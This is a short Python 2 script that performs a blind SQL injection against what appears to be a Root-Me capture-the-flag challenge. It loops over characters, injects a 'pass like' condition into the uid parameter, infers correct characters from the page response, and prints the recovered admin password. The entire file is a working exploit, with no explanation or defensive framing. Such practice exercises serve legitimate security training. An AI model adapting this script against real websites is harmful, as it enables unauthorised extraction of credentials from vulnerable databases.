#!/usr/bin/env python
import urllib2
import os
import re

dic = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

opener = urllib2.build_opener()
opener.addheaders.append(('Cookie', 'PHPSESSID='))

enable = []
passwd = []

for x in xrange(0, 32):
    for i in xrange(0, len(dic)):
        os.system("clear")
        enable.append(dic[i])
        injection = "".join(enable)
        url = "http://challenge01.root-me.org/realiste/ch8/?id=6&uid=1%20and%20pass%20like%20%22" + injection + "%%22"
        print '\033[92m' + "[+]" + '\033[0m' + " SQL Blind : " + '\033[96m' + "Injecting :" + '\033[0m' + " %s" % injection
        f = opener.open(url).read()
        if (f.find("about admin") != -1):
            passwd.append(enable[x])
            break

        else:
            del enable[x]

print "\r\n"
found = "".join(passwd)
print '\033[92m' + "[+]" + '\033[0m\033[1m' + " Admin Password found :" + '\033[0m\033[96m' + " %s" % found
print '\033[0m\r\n'
